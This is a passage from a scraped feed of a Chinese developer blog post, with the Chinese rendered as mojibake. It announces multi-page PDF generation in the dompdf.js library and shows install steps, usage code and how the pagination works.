</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯ä¸€è¡Œä»£ç ç”Ÿæˆæ•°åƒé¡µPDFï¼Œdompdf.jsæ–°å¢åˆ†é¡µåŠŸèƒ½]]></title>    <link>https://juejin.cn/post/7583912637470769203</link>    <guid>https://juejin.cn/post/7583912637470769203</guid>    <pubDate>2025-12-15T18:46:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583912637470769203" data-draft-id="7576559408659529780" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯ä¸€è¡Œä»£ç ç”Ÿæˆæ•°åƒé¡µPDFï¼Œdompdf.jsæ–°å¢åˆ†é¡µåŠŸèƒ½ "/> <meta itemprop="keywords" content="å‰ç«¯,å¼€æº,TypeScript"/> <meta itemprop="datePublished" content="2025-12-15T18:46:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åˆ˜å‘è´¢"/> <meta itemprop="url" content="https://juejin.cn/user/4089838985816968"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯ä¸€è¡Œä»£ç ç”Ÿæˆæ•°åƒé¡µPDFï¼Œdompdf.jsæ–°å¢åˆ†é¡µåŠŸèƒ½ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4089838985816968/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åˆ˜å‘è´¢
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T18:46:14.000Z" title="Mon Dec 15 2025 18:46:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.7;font-weight:400;font-size:16px;overflow-x:hidden;color:#2c3e50;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;font-weight:600;margin-top:35px;margin-bottom:8px;padding-bottom:5px}.markdown-body h1 :before,.markdown-body h2 :before,.markdown-body h3 :before,.markdown-body h4 :before,.markdown-body h5 :before,.markdown-body h6 :before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:8px;margin-top:50px;font-size:24px;border-bottom:1px solid #eaecef}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #eaecef;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;font-weight:400;background-color:rgba(27,31,35,.05);color:#476582;margin:0;font-size:.85em;border-radius:3px;font-size:.87em;padding:.165em .5em}.markdown-body code,.markdown-body pre{font-family:source-code-pro,Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.6;padding:20px 24px;background-color:#282c34;border-radius:6px}.markdown-body pre&gt;code{font-size:14px;padding:0;margin:0;word-break:normal;display:block;overflow-x:auto;color:#fff}.markdown-body a{text-decoration:none;color:#3eaf7c;font-weight:500}.markdown-body a:active,.markdown-body a:hover{color:#42b983;border-bottom:1px solid #42b983}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;margin:16px 0;border-collapse:collapse}.markdown-body thead{background:#f6f6f6;background:#3eaf7c;color:#000;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f6f8fa}.markdown-body td,.markdown-body th{border:1px solid #dfe2e5;padding:10px 16px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{font-size:14px;padding:6px 23px;margin:22px 0;border-left:6px solid #42b983;background-color:#f3f5f7;font-weight:400}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body p,.markdown-body ul{line-height:1.7}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="base16/tomorrow-night">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å‰ç«¯ç”Ÿæˆ PDF ä¸æ¸…æ™°ï¼Ÿæ–‡å­—æ— æ³•æœç´¢é€‰ä¸­ç¼–è¾‘ï¼Ÿä½“ç§¯å¤ªå¤§ï¼Ÿåˆ†é¡µåˆ‡å‰²ä¸ç²¾å‡†ï¼Ÿç”Ÿæˆé¡µæ•°å¤ªå°‘ï¼Ÿ<code>dompdf.js</code>V1.1.0 ç‰ˆæœ¬æ›´æ–°åï¼Œè¿™äº›éƒ½ä¸åœ¨æ˜¯é—®é¢˜ï¼Œåªéœ€è¦ä¸€è¡Œä»£ç ï¼Œå°±å¯ä»¥å°† html é¡µé¢ç”Ÿæˆæ•°åƒé¡µ PDF æ–‡ä»¶ï¼Œè¿™å¯èƒ½æ˜¯å‰ç«¯é¦–ä¸ªå®ç°è¿™ä¸€åŠŸèƒ½çš„ js åº“ã€‚</p>
<p>dompdf.js æ˜¯ä½œè€…å¼€æºçš„å‰ç«¯ PDF ç”Ÿæˆåº“ã€‚å¯ä»¥çº¯å‰ç«¯å°† html ç”Ÿæˆä¸ºéå›¾ç‰‡å¼çš„ï¼Œå¯ç¼–è¾‘ï¼Œå°ä½“ç§¯çš„ PDF æ–‡ä»¶ã€‚<a href="https://juejin.cn/post/7559886023661649958" target="_blank" title="https://juejin.cn/post/7559886023661649958">ä¸Šä¸€ç¯‡æ–‡ç«  https://juejin.cn/post/7559886023661649958</a>æœ‰åšç›¸å…³ä»‹ç»ã€‚ä¹‹å‰çš„ç‰ˆæœ¬åªèƒ½ç”Ÿæˆå•é¡µ PDFï¼Œå¾ˆå¤šå¼€å‘è€…åé¦ˆæœ‰ç”Ÿæˆå¤šé¡µ PDF çš„éœ€æ±‚ï¼Œä½œè€…èŠ±äº†ç‚¹æ—¶é—´åœ¨ V1.1.0 ç‰ˆæœ¬æ–°å¢äº†åˆ†é¡µåŠŸèƒ½ï¼Œ<strong>å¯ä»¥å°† html é¡µé¢ç”Ÿæˆä¸ºå¤šé¡µ PDF æ–‡ä»¶</strong>ã€‚</p>
<h3 data-id="heading-0">ä»£ç ç¤ºä¾‹</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> dompdf <span class="hljs-keyword">from</span> <span class="hljs-string">"dompdf.js"</span>;

<span class="hljs-title function_">dompdf</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#capture"</span>), { <span class="hljs-attr">pagination</span>: <span class="hljs-literal">true</span> }).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">
  blob
</span>) {
  <span class="hljs-comment">//æ–‡ä»¶æ“ä½œ</span>
});
</code></pre>
<p>å®ç°æ•ˆæœå¦‚ä¸‹(æ•°åƒé¡µPDF)ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c9c550042fa491b936f450e3036a7f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YiY5Y-R6LSi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766429174&amp;x-signature=Kk4HEMgBPl4It7%2FzfmxoUR63%2BdI%3D" alt="æ€»é¡µæ•°.png" loading="lazy"/></p>
<p><strong>å½“ç„¶ï¼Œç”Ÿæˆæ•°åƒé¡µçš„ PDF æ˜¯éå¸¸æç«¯çš„æƒ…å†µæ‰èƒ½è¾¾æˆï¼Œå†³å®šèƒ½ç”Ÿæˆå¤šå°‘é¡µ PDF çš„ï¼Œè¦çœ‹æ–‡ä»¶å¤§å°ï¼Œå¦‚æœæ˜¯çº¯æ–‡å­— PDFï¼Œå°±èƒ½ç”Ÿæˆæ›´å¤šçš„é¡µæ•°ï¼Œåä¹‹å¦‚æœ PDF ä¸­æœ‰å›¾ç‰‡ï¼Œç”Ÿæˆçš„é¡µæ•°å°±ä¼šå°‘</strong></p>
<h2 data-id="heading-1">1. åœ¨çº¿ä½“éªŒ</h2>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdompdfjs.lisky.com.cn" target="_blank" title="https://dompdfjs.lisky.com.cn" ref="nofollow noopener noreferrer">dompdfjs.lisky.com.cn</a></p>
</blockquote>
<h2 data-id="heading-2">2. Git ä»“åº“åœ°å€ (æ¬¢è¿ Starâ­â­â­)</h2>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flmn1919%2Fdompdf.js" target="_blank" title="https://github.com/lmn1919/dompdf.js" ref="nofollow noopener noreferrer">github.com/lmn1919/domâ€¦</a></p>
</blockquote>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fliu-facai%2Fdompdf.js" target="_blank" title="https://gitee.com/liu-facai/dompdf.js" ref="nofollow noopener noreferrer">gitee.com/liu-facai/dâ€¦</a></p>
</blockquote>
<h2 data-id="heading-3">3.ç‰ˆæœ¬æ–°åŠŸèƒ½ç‰¹æ€§</h2>
<h3 data-id="heading-4">1. åˆ†é¡µåŠŸèƒ½-ç²¾å‡†çš„é¡µé¢åˆ†å‰²</h3>
<h4 data-id="heading-5">å›¾ç‰‡åˆ†é¡µæ•ˆæœ</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58764661c6044b2b92094cfb00561eb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YiY5Y-R6LSi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766429174&amp;x-signature=2l859tm8n6%2BCgtqWpClmel2QAw0%3D" alt="å›¾ç‰‡åˆ†å‰²æ•ˆæœ.png" loading="lazy"/></p>
<h4 data-id="heading-6">å·¦å³å¸ƒå±€åˆ†é¡µæ•ˆæœ</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/283574b2fc6b4b82bc5b944cc366e3fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YiY5Y-R6LSi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766429174&amp;x-signature=y6mlDjrHcyfzViNCOwGwsEHihNg%3D" alt="å·¦å³å¸ƒå±€åˆ†å‰².png" loading="lazy"/></p>
<h4 data-id="heading-7">æ–‡æœ¬åˆ†é¡µæ•ˆæœ</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/245d2186177843a7b0c74acef7d7042f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YiY5Y-R6LSi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766429174&amp;x-signature=%2FekBgW35AIfGy6hfT4Jd77n5qts%3D" alt="æ–‡æœ¬åˆ†å‰²æ•ˆæœ.png" loading="lazy"/></p>
<h4 data-id="heading-8">å¤æ‚è¡¨æ ¼åˆ†é¡µæ•ˆæœ</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9acff792081a4de19dadbc7b29832026~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YiY5Y-R6LSi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766429174&amp;x-signature=L6OHp4hx2radYQe5tdqbaNX5plo%3D" alt="å¤æ‚è¡¨æ ¼åˆ†å‰².png" loading="lazy"/></p>
<h3 data-id="heading-9">2. è‡ªå®šä¹‰é¡µçœ‰é¡µè„š</h3>
<p>å¯ä»¥è®¾ç½®é¡µçœ‰é¡µè„šçš„é«˜åº¦ï¼Œå†…å®¹ï¼Œå­—ä½“å¤§å°ï¼Œå­—ä½“é¢œè‰²ç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f42db54b4bd2456db89ec291d40954bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YiY5Y-R6LSi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766429174&amp;x-signature=Yu5LJoONuQNtB6iXH6MfFhkMbAI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">3. PDF å¯†ç ã€æ“ä½œæƒé™è®¾ç½®ï¼ŒPDF å‹ç¼©</h3>
<h2 data-id="heading-11">4.åˆ†é¡µå®ç°åŸç†</h2>
<p><code>dompdf.js</code> æ˜¯å¦‚ä½•å°† html é¡µé¢ç”Ÿæˆä¸ºå¤šé¡µ PDF æ–‡ä»¶çš„ï¼Ÿ</p>
<ol>
<li>
<p>å…ˆå°† html è§£æä¸º DOM æ ‘ã€‚DOM æ ‘ä¸»è¦åŒ…å« DOM å…ƒç´ çš„ä½ç½®ä¿¡æ¯ï¼ˆbounds: width|height|left|topï¼‰ã€æ ·å¼æ•°æ®ã€æ–‡æœ¬èŠ‚ç‚¹æ•°æ®ç­‰ã€‚
å¤§è‡´çš„ç»“æ„ä¸ºï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">{
<span class="hljs-attr">bounds</span>: {<span class="hljs-attr">height</span>: <span class="hljs-number">1303.6875</span>, <span class="hljs-attr">left</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">top</span>: -<span class="hljs-number">298.5625</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">1273</span>},
<span class="hljs-attr">elements</span>: [
        {
        <span class="hljs-attr">bounds</span>: {<span class="hljs-attr">left</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">top</span>: -<span class="hljs-number">298.5625</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">1273</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">1303.6875</span>},
        <span class="hljs-attr">elements</span>: [
                {
                <span class="hljs-attr">bounds</span>: {<span class="hljs-attr">left</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">top</span>: -<span class="hljs-number">298.5625</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">1273</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">1303.6875</span>},
                <span class="hljs-attr">elements</span>: [
                        {<span class="hljs-attr">styles</span>: <span class="hljs-title class_">CSSParsedDeclaration</span>, <span class="hljs-attr">textNodes</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), <span class="hljs-attr">elements</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">0</span>), <span class="hljs-attr">bounds</span>: <span class="hljs-title class_">Bounds</span>, <span class="hljs-attr">flags</span>: <span class="hljs-number">0</span>},
                        {<span class="hljs-attr">styles</span>: <span class="hljs-title class_">CSSParsedDeclaration</span>, <span class="hljs-attr">textNodes</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), <span class="hljs-attr">elements</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">0</span>), <span class="hljs-attr">bounds</span>: <span class="hljs-title class_">Bounds</span>, <span class="hljs-attr">flags</span>: <span class="hljs-number">0</span>},
                        ...
                ],
                <span class="hljs-attr">flags</span>: <span class="hljs-number">0</span>,
                <span class="hljs-attr">styles</span>: {<span class="hljs-attr">backgroundClip</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), <span class="hljs-attr">backgroundColor</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">backgroundImage</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">0</span>), <span class="hljs-attr">backgroundOrigin</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), <span class="hljs-attr">backgroundPosition</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), â€¦},
                <span class="hljs-attr">textNodes</span>: []
                }
        ],
        <span class="hljs-attr">flags</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">styles</span>: <span class="hljs-title class_">CSSParsedDeclaration</span> {<span class="hljs-attr">backgroundClip</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), <span class="hljs-attr">backgroundColor</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">backgroundImage</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">0</span>), <span class="hljs-attr">backgroundOrigin</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), <span class="hljs-attr">backgroundPosition</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), â€¦},
        <span class="hljs-attr">textNodes</span>: []
        }
],
<span class="hljs-attr">flags</span>: <span class="hljs-number">4</span>,
<span class="hljs-attr">styles</span>: <span class="hljs-title class_">CSSParsedDeclaration</span> {<span class="hljs-attr">backgroundClip</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), <span class="hljs-attr">backgroundColor</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">backgroundImage</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">0</span>), <span class="hljs-attr">backgroundOrigin</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), <span class="hljs-attr">backgroundPosition</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">1</span>), â€¦},
<span class="hljs-attr">textNodes</span>: []
}
</code></pre>
</li>
<li>
<p>é€’å½’ DOM æ ‘çš„ elements ä»¥åŠ textNodesï¼Œé€šè¿‡ bounds.top+bounds.height åˆ¤æ–­æ˜¯å¦éœ€è¦åˆ†é¡µï¼Œå°† DOM æ ‘æŒ‰ç…§é¡µé¢åˆ†å‰²æˆå¤šä¸ªåˆ†é¡µ DOM æ ‘ï¼Œå¹¶é‡æ–°è®¡ç®— elements å’Œ textNodes çš„ boundsã€‚
æ¯”å¦‚ä¸€ä¸ª textNodes çš„ä½ç½®ä¿¡æ¯æ˜¯è¿™æ ·çš„ï¼š</p>
</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript">{
 <span class="hljs-attr">bounds</span>: {<span class="hljs-attr">left</span>: <span class="hljs-number">8</span>, <span class="hljs-attr">top</span>: <span class="hljs-number">1115</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">850</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">24</span>},
 <span class="hljs-attr">text</span>: <span class="hljs-string">"è¿™æ˜¯ä¸€ä¸ªæ–‡æœ¬èŠ‚ç‚¹"</span>
}
</code></pre>
<p>å¦‚æœæˆ‘ä»¬è¦æŒ‰ç…§ <code>a4</code> çº¸å¼ çš„é«˜åº¦ï¼ˆ1123pxï¼‰æ¥åˆ†é¡µï¼Œé‚£ä¹ˆå½“æ–‡æœ¬èŠ‚ç‚¹çš„ top åŠ ä¸Š height å¤§äº 1123px æ—¶ï¼Œè€Œ top çš„å€¼ 1115px å°äº 1123pxï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡æœ¬èŠ‚ç‚¹å°±ä¼šåˆ†å‰²åˆ°ç¬¬äºŒé¡µã€‚å¹¶ä¸” top å€¼ä¼šé‡ç½®ä¸º 0ï¼Œåç»­é¡¹çš„ top å€¼ä¹Ÿä¼šå‡å°‘ç›¸åº”çš„å€¼ï¼Œç¡®ä¿å…ƒç´ ä½ç½®çš„å‡†ç¡®æ€§ã€‚</p>
<ol start="3">
<li>
<p>å¾ªç¯ DOM æ ‘åˆ†é¡µæ•°ç»„ï¼Œè°ƒç”¨ <code>jspdf.addPage()</code> æ–¹æ³•æ·»åŠ æ–°é¡µé¢ï¼Œå¹¶ç»˜åˆ¶é¡µçœ‰é¡µè„šã€‚æ ¹æ®ä¸åŒçš„å…ƒç´ ç±»å‹ï¼Œä»¥åŠå…ƒç´ çš„ä½ç½®ä¿¡æ¯ï¼Œè°ƒç”¨ä¸åŒçš„ jspdf æ–¹æ³•ç”Ÿæˆ pdfã€‚
æ¯”å¦‚ç»˜åˆ¶æ–‡å­—ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">jspdf.<span class="hljs-title function_">text</span>(<span class="hljs-string">"è¿™æ˜¯ä¸€ä¸ªæ–‡æœ¬èŠ‚ç‚¹"</span>, <span class="hljs-number">1115</span>, <span class="hljs-number">8</span>);
</code></pre>
<p>ç»˜åˆ¶å›¾ç‰‡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">jspdf.<span class="hljs-title function_">image</span>(img, x, y, width, height);
</code></pre>
</li>
</ol>
<h2 data-id="heading-12">5.ä½¿ç”¨æ–‡æ¡£</h2>
<p>å®‰è£…ï¼š</p>
<pre><code class="hljs language-BASH" lang="BASH">npm install dompdf.js --save
</code></pre>
<p>CDN å¼•å…¥ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/dompdf.js@latest/dist/dompdf.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-13">åŸºç¡€ç”¨æ³•</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> dompdf <span class="hljs-keyword">from</span> <span class="hljs-string">"dompdf.js"</span>;

<span class="hljs-title function_">dompdf</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#capture"</span>), options)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">blob</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> url = <span class="hljs-variable constant_">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob);
    <span class="hljs-keyword">const</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"a"</span>);
    a.<span class="hljs-property">href</span> = url;
    a.<span class="hljs-property">download</span> = <span class="hljs-string">"example.pdf"</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);
    a.<span class="hljs-title function_">click</span>();
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
  });
</code></pre>
<h4 data-id="heading-14">PDF åˆ†é¡µæ¸²æŸ“</h4>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œdompdf ä¼šå°†æ•´ä¸ªæ–‡æ¡£æ¸²æŸ“åˆ°å•é¡µä¸­ã€‚</p>
<p>æ‚¨å¯ä»¥é€šè¿‡è®¾ç½® <code>pagination</code> é€‰é¡¹ä¸º <code>true</code> æ¥å¼€å¯åˆ†é¡µæ¸²æŸ“ã€‚é€šè¿‡ pageConfig å­—æ®µè‡ªå®šä¹‰é¡µçœ‰é¡µè„šçš„å°ºå¯¸ï¼Œå†…å®¹ï¼Œå­—ä½“é¢œè‰²/å¤§å°ï¼Œä½ç½®ç­‰ä¿¡æ¯ã€‚</p>
<p><strong>éå¸¸é‡è¦ï¼ï¼ï¼ï¼éå¸¸é‡è¦ï¼ï¼ï¼ï¼éå¸¸é‡è¦ï¼ï¼ï¼ï¼éå¸¸é‡è¦ï¼ï¼ï¼ï¼éå¸¸é‡è¦ï¼ï¼ï¼ï¼</strong></p>
<p><strong>éœ€è¦å°†è¦ç”ŸæˆPDFçš„domèŠ‚ç‚¹è®¾ç½®ä¸ºå¯¹åº”çš„é¡µé¢å®½åº¦ï¼ˆpxï¼‰,æ¯”å¦‚a4è¦è®¾ç½®å®½åº¦ä¸º794px,è¿™é‡Œæ˜¯é¡µé¢å°ºå¯¸å¯¹ç…§è¡¨ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdompdfjs.lisky.com.cn%2Fdocumentation.html" target="_blank" title="https://dompdfjs.lisky.com.cn/documentation.html" ref="nofollow noopener noreferrer">è¯·ç‚¹å‡»æŸ¥çœ‹</a></strong></p>
<pre><code class="hljs language-html" lang="html">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
    <span class="hljs-attr">id</span>=<span class="hljs-string">"capture"</span>
    <span class="hljs-attr">style</span>=<span class="hljs-string">"width:794px"</span>
    &gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> dompdf <span class="hljs-keyword">from</span> <span class="hljs-string">"dompdf.js"</span>;

<span class="hljs-title function_">dompdf</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#capture"</span>), {
  <span class="hljs-attr">pagination</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">format</span>: <span class="hljs-string">"a4"</span>,
  <span class="hljs-attr">pageConfig</span>: {
    <span class="hljs-attr">header</span>: {
      <span class="hljs-attr">content</span>: <span class="hljs-string">"è¿™æ˜¯é¡µçœ‰"</span>,
      <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
      <span class="hljs-attr">contentColor</span>: <span class="hljs-string">"#333333"</span>,
      <span class="hljs-attr">contentFontSize</span>: <span class="hljs-number">12</span>,
      <span class="hljs-attr">contentPosition</span>: <span class="hljs-string">"center"</span>,
